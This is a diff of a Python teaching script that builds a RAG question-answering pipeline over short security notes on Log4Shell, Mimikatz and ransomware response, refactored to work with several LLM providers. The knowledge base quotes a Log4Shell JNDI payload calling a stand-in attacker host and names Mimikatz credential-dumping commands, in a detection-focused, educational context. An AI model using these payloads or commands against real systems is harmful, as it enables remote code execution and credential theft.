@@ -1,263 +1,152 @@
 # Lesson 4.4 — RAG (Retrieval-Augmented Generation)
 #
-# Build a RAG pipeline that lets Claude answer questions
+# Build a RAG pipeline that lets any LLM answer questions
 # grounded in your own security documents.
 #
-# Components:
-#   1. Document ingestion and chunking
-#   2. Embedding with sentence-transformers
-#   3. Cosine similarity retrieval
-#   4. Grounded generation with Claude
+# Works with Claude, OpenAI, or Gemini — whichever key you have set.
+# Set ONE of:
+#   set ANTHROPIC_API_KEY=...
+#   set OPENAI_API_KEY=...
+#   set GOOGLE_API_KEY=...
 #
-# pip install anthropic sentence-transformers numpy
+# pip install sentence-transformers  (or scikit-learn as fallback)
 
-import os
-import json
 import numpy as np
 from typing import List, Dict
+from llm_client import get_client
 
-# ── Try to import sentence-transformers ───────────────────────────────────────
-try:
-    from sentence_transformers import SentenceTransformer
-    HAVE_ST = True
-except ImportError:
-    HAVE_ST = False
-    print("sentence-transformers not installed. Run: pip install sentence-transformers")
-    print("Using a simplified TF-IDF fallback for the demo.\n")
-
-import anthropic
+provider, client = get_client()
 
 print("=" * 60)
 print("  LESSON 4.4: RAG — SECURITY DOCUMENT Q&A")
 print("=" * 60)
 
-# ── 1. Sample security knowledge base ────────────────────────────────────────
-# In a real system you'd load from files, databases, or APIs (e.g. NVD, MITRE)
+# ── 1. Sample security knowledge base ─────────────────────────────────────────
 SECURITY_DOCS = {
     "log4shell": """
-CVE-2021-44228 — Log4Shell
-Severity: Critical (CVSS 10.0)
-Affected: Apache Log4j 2.x versions 2.0-beta9 through 2.14.1
-
-Description:
-Apache Log4j2 JNDI lookups allow attacker-controlled JNDI URIs to trigger
-remote class loading. An attacker who can control log messages or log message
-parameters can execute arbitrary code on the server.
-
-Attack vector: Network. No authentication required. Trivially exploitable.
-Attack pattern: ${jndi:ldap://attacker.com/exploit} injected into any logged field
-  such as HTTP User-Agent, X-Forwarded-For, username, or any other logged parameter.
-
-Affected products: Any Java application using Log4j2 for logging, including
-  Minecraft, VMware vCenter, Cisco products, and thousands of web applications.
-
-Remediation:
-  1. Upgrade to Log4j 2.17.1 or later (primary fix)
-  2. Set log4j2.formatMsgNoLookups=true as JVM argument (temporary mitigation)
-  3. Remove JndiLookup class from classpath as emergency measure
-  4. Apply WAF rules to block ${jndi: patterns in HTTP requests
-
-Detection: Monitor for outbound LDAP/RMI connections from application servers.
-  Look for strings matching \$\{jndi: in web server access logs.
+CVE-2021-44228 — Log4Shell (Critical CVSS 10.0)
+Affected: Apache Log4j2 2.0-beta9 through 2.14.1
+Attack: ${jndi:ldap://attacker.com/x} injected into any logged field triggers remote class loading.
+No authentication required. Exploitable via HTTP User-Agent, X-Forwarded-For, or any logged parameter.
+Remediation: Upgrade to Log4j 2.17.1+. Mitigation: -Dlog4j2.formatMsgNoLookups=true.
+Detection: Outbound LDAP from app servers. ${jndi: patterns in web logs.
 """,
-
     "mimikatz": """
-Mimikatz — Credential Dumping Tool
-MITRE ATT&CK: T1003 - OS Credential Dumping
-
-Overview:
-Mimikatz is an open-source credential harvesting tool that extracts plaintext
-passwords, hashes, PINs, and Kerberos tickets from Windows memory (LSASS process).
-
-Common attack scenarios:
-  - sekurlsa::logonpasswords: Dumps plaintext credentials from LSASS memory
-  - sekurlsa::wdigest: Extracts WDigest credentials (pre-Windows 8.1)
-  - lsadump::dcsync: Simulates domain controller replication to dump AD hashes
-  - kerberos::golden: Creates Golden Tickets for persistent access
-  - pass-the-hash: Authenticate using NTLM hash without knowing plaintext password
-
-Detection signals:
-  - LSASS memory access by non-system processes (Event ID 4688, Sysmon Event 10)
-  - sekurlsa strings in process command line arguments
-  - Unexpected LSASS dump files (lsass.dmp)
-  - Suspicious access to HKLM\\SAM registry hive
-  - Domain controller replication from non-DC sources (Event ID 4662)
-
-Mitigations:
-  - Enable Credential Guard (requires Windows 10 / Server 2016+)
-  - Disable WDigest authentication (registry key)
-  - Implement Protected Users security group for privileged accounts
-  - Deploy AV/EDR with LSASS protection rules
-  - Reduce local admin rights to limit blast radius
+Mimikatz — Credential Dumping (MITRE T1003)
+Extracts plaintext passwords, NTLM hashes, and Kerberos tickets from Windows LSASS memory.
+Common techniques: sekurlsa::logonpasswords, lsadump::dcsync, kerberos::golden (Golden Ticket).
+Detection: LSASS memory access by non-system processes (Sysmon Event ID 10), unexpected lsass.dmp files.
+Mitigations: Enable Credential Guard, disable WDigest auth, use Protected Users group.
 """,
-
     "ransomware_response": """
 Ransomware Incident Response Playbook
-
-Phase 1 — Detection and Triage (0-30 minutes)
-  1. Confirm ransomware indicators: encrypted files, ransom note, C2 beaconing
-  2. Identify Patient Zero — first infected host
-  3. Assess blast radius: how many hosts and shares affected?
-  4. Do NOT restart or power off infected hosts (destroys forensic evidence)
-
-Phase 2 — Containment (30 minutes - 2 hours)
-  1. Isolate infected systems from network (VLAN isolation, not shutdown)
-  2. Disable affected user accounts
-  3. Block known ransomware C2 IPs/domains at perimeter
-  4. Identify and disconnect compromised backup systems
-  5. Alert executive team and legal counsel
-
-Phase 3 — Eradication (2-24 hours)
-  1. Identify and remove ransomware binaries and persistence mechanisms
-  2. Reset all potentially compromised credentials
-  3. Patch the initial access vector (if known)
-  4. Audit all privileged accounts for signs of compromise
-
-Phase 4 — Recovery (1-7 days)
-  1. Restore from known-good backups (verify backups are clean first)
-  2. Rebuild affected systems from clean image if backup unavailable
-  3. Prioritise business-critical systems for restoration
-  4. Monitor restored systems for re-infection
-
-Phase 5 — Lessons Learned (post-incident)
-  1. Root cause analysis
-  2. Update detection rules
-  3. Test backup restoration procedures
-  4. Consider cyber insurance claim if applicable
+Phase 1 (0-30 min): Confirm indicators, identify Patient Zero, assess blast radius. Do NOT reboot.
+Phase 2 (30 min-2 hr): Isolate via VLAN (not shutdown), disable accounts, block C2 at perimeter.
+Phase 3 (2-24 hr): Remove persistence mechanisms, reset all credentials, patch initial access vector.
+Phase 4 (1-7 days): Restore from clean backups, prioritise critical systems, monitor for re-infection.
+Phase 5: Root cause analysis, update detection rules, test backups.
 """,
 }
 
 # ── 2. Chunking ────────────────────────────────────────────────────────────────
-def chunk_document(text: str, chunk_size: int = 150, overlap: int = 20) -> List[str]:
-    """Split text into overlapping word chunks."""
+def chunk_document(text: str, size: int = 100, overlap: int = 15) -> List[str]:
     words = text.split()
     chunks = []
-    for i in range(0, len(words), chunk_size - overlap):
-        chunk = ' '.join(words[i:i + chunk_size])
-        if len(chunk.strip()) > 50:  # skip tiny trailing chunks
-            chunks.append(chunk)
+    for i in range(0, len(words), size - overlap):
+        c = ' '.join(words[i:i + size])
+        if len(c.split()) > 20:
+            chunks.append(c)
     return chunks
 
-# Build the chunk corpus
-all_chunks = []
-chunk_sources = []
-
-for doc_name, doc_text in SECURITY_DOCS.items():
-    chunks = chunk_document(doc_text)
-    all_chunks.extend(chunks)
-    chunk_sources.extend([doc_name] * len(chunks))
+all_chunks, chunk_sources = [], []
+for name, text in SECURITY_DOCS.items():
+    for chunk in chunk_document(text):
+        all_chunks.append(chunk)
+        chunk_sources.append(name)
 
 print(f"\nKnowledge base: {len(SECURITY_DOCS)} documents → {len(all_chunks)} chunks")
 
 # ── 3. Embedding ───────────────────────────────────────────────────────────────
-if HAVE_ST:
-    print("\nEmbedding chunks with sentence-transformers...")
-    embed_model = SentenceTransformer('all-MiniLM-L6-v2')
-    chunk_embeddings = embed_model.encode(all_chunks, show_progress_bar=True)
-
-    def embed_query(text: str) -> np.ndarray:
-        return embed_model.encode([text])[0]
-
-else:
-    # TF-IDF fallback
+try:
+    from sentence_transformers import SentenceTransformer
+    print("Loading sentence-transformers embedding model...")
+    _embed_model = SentenceTransformer('all-MiniLM-L6-v2')
+    chunk_embeddings = _embed_model.encode(all_chunks)
+    def embed(text): return _embed_model.encode([text])[0]
+except ImportError:
     from sklearn.feature_extraction.text import TfidfVectorizer
-    from sklearn.metrics.pairwise import cosine_similarity as sk_cosine
-
-    print("Using TF-IDF fallback for embeddings...")
-    tfidf = TfidfVectorizer(stop_words='english')
-    chunk_embeddings = tfidf.fit_transform(all_chunks).toarray()
-
-    def embed_query(text: str) -> np.ndarray:
-        return tfidf.transform([text]).toarray()[0]
-
-print(f"Embeddings shape: {chunk_embeddings.shape}")
+    print("Using TF-IDF embeddings (run: pip install sentence-transformers for better results)")
+    _tfidf = TfidfVectorizer(stop_words='english')
+    chunk_embeddings = _tfidf.fit_transform(all_chunks).toarray()
+    def embed(text): return _tfidf.transform([text]).toarray()[0]
 
 # ── 4. Retrieval ───────────────────────────────────────────────────────────────
-def cosine_sim(a: np.ndarray, b: np.ndarray) -> float:
-    return np.dot(a, b) / (np.linalg.norm(a) * np.linalg.norm(b) + 1e-8)
-
 def retrieve(question: str, k: int = 3) -> List[Dict]:
-    q_vec = embed_query(question)
-    scores = [cosine_sim(q_vec, c) for c in chunk_embeddings]
-    top_k = sorted(enumerate(scores), key=lambda x: x[1], reverse=True)[:k]
-    return [
-        {'chunk': all_chunks[i], 'source': chunk_sources[i], 'score': score}
-        for i, score in top_k
-    ]
+    q = embed(question)
+    scores = [np.dot(q, c) / (np.linalg.norm(q) * np.linalg.norm(c) + 1e-8)
+              for c in chunk_embeddings]
+    top = sorted(enumerate(scores), key=lambda x: x[1], reverse=True)[:k]
+    return [{'text': all_chunks[i], 'source': chunk_sources[i], 'score': s}
+            for i, s in top if s > 0.05]
 
-# ── 5. RAG generation with Claude ─────────────────────────────────────────────
-api_key = os.environ.get("ANTHROPIC_API_KEY")
+# ── 5. RAG generation ─────────────────────────────────────────────────────────
+def ask(question: str) -> str:
+    retrieved = retrieve(question)
+    if not retrieved:
+        return "No relevant information found in the knowledge base."
 
-def ask(question: str, use_rag: bool = True, verbose: bool = True) -> str:
-    if verbose:
-        print(f"\n{'='*50}")
-        print(f"Q: {question}")
+    context = "\n\n".join([f"[{r['source']}]\n{r['text']}" for r in retrieved])
 
-    if use_rag:
-        retrieved = retrieve(question, k=3)
-        context = "\n\n---\n\n".join([
-            f"Source: {r['source']}\n{r['chunk']}"
-            for r in retrieved
-        ])
-        if verbose:
-            print(f"\nRetrieved {len(retrieved)} chunks:")
-            for r in retrieved:
-                print(f"  [{r['score']:.3f}] {r['source']}: {r['chunk'][:60]}...")
+    print(f"\n{'='*50}")
+    print(f"Q: {question}")
+    print(f"Retrieved: {', '.join(set(r['source'] for r in retrieved))}")
 
-        system = """You are a cybersecurity expert. Answer questions using ONLY the
-provided context. If the answer is not in the context, say "I don't have information
-about that in the provided documents." Cite the source document name in your answer."""
+    if client is None:
+        print("A: [No API key — showing retrieval only]")
+        print(f"   Top chunk: {retrieved[0]['text'][:150]}...")
+        return ""
 
-        prompt = f"""Context:
-{context}
+    system = """Answer questions using ONLY the provided context.
+If the answer is not in the context, say so clearly — do not hallucinate.
+Cite the source document name."""
 
-Question: {question}"""
-    else:
-        system = "You are a cybersecurity expert. Answer concisely."
-        prompt = question
+    prompt = f"Context:\n{context}\n\nQuestion: {question}"
 
-    if not api_key:
-        # Demo mode without API key
-        if verbose:
-            print("\nA: [API key not set — showing retrieval only]")
-            if use_rag and retrieved:
-                print(f"   Would answer from: {retrieved[0]['source']}")
-        return "[No API key]"
-
-    client = anthropic.Anthropic(api_key=api_key)
-    response = client.messages.create(
-        model="claude-sonnet-4-6",
-        max_tokens=500,
+    answer = client.chat(
         system=system,
-        messages=[{"role": "user", "content": prompt}]
+        messages=[{"role": "user", "content": prompt}],
+        max_tokens=400,
     )
-    answer = response.content[0].text
-    if verbose:
-        print(f"\nA: {answer}")
+    print(f"\nA: {answer}")
     return answer
 
 # ── 6. Test questions ──────────────────────────────────────────────────────────
-print("\n\n── Testing RAG System ──")
-
+print("\n── Testing RAG System ──")
 questions = [
-    "How do I detect Mimikatz running on a Windows machine?",
+    "How do I detect Mimikatz on a Windows machine?",
     "What should I do in the first 30 minutes of a ransomware attack?",
-    "How does Log4Shell get exploited and how do I mitigate it?",
-    "What is the CVSS score of CVE-2021-44228?",
+    "How does Log4Shell get exploited and how do I fix it?",
 ]
-
 for q in questions:
-    ask(q, use_rag=True)
+    ask(q)
 
-# ── 7. Hallucination demo (no RAG) ────────────────────────────────────────────
-if api_key:
-    print("\n\n── Hallucination Demo: RAG vs No RAG ──")
-    tricky_q = "What is our organisation's specific ransomware recovery time objective?"
-    print("\nWITH RAG:")
-    ask(tricky_q, use_rag=True)
+# ── 7. Hallucination demo ──────────────────────────────────────────────────────
+if client:
+    print("\n\n── Hallucination Demo ──")
+    q = "What is our organisation's specific recovery time objective?"
+    retrieved = retrieve(q)
+    context = "\n\n".join([f"[{r['source']}]\n{r['text']}" for r in retrieved]) if retrieved else ""
+
+    print("\nWITH RAG (grounded):")
+    ask(q)
+
     print("\nWITHOUT RAG (may hallucinate):")
-    ask(tricky_q, use_rag=False)
+    answer = client.chat(
+        system="You are a cybersecurity expert. Answer concisely.",
+        messages=[{"role": "user", "content": q}],
+        max_tokens=200,
+    )
+    print(f"A: {answer}")
 
 print("\n" + "=" * 60)
-print("RAG pipeline complete.")
-print("Next: Milestone — full security assistant with your own documents.")
+print("RAG pipeline complete. Next: Milestone — full security assistant.")
